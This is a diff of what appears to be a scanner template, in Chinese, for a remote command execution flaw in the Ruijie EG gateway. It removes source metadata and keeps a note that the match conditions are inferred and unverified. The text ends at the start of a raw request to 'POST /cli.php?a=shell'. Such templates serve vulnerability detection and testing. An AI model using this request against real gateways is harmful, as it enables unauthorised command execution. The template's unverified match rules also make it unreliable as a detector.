@@ -3,13 +3,8 @@ info:
   name: 锐捷EG易网关cli存在后台远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/90ff66215dbddea2cb2c9b95b047ec2d
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 90ff66215dbddea2cb2c9b95b047ec2d
 http:
 - raw:
   - 'POST /cli.php?a=shell HTTP/1.1
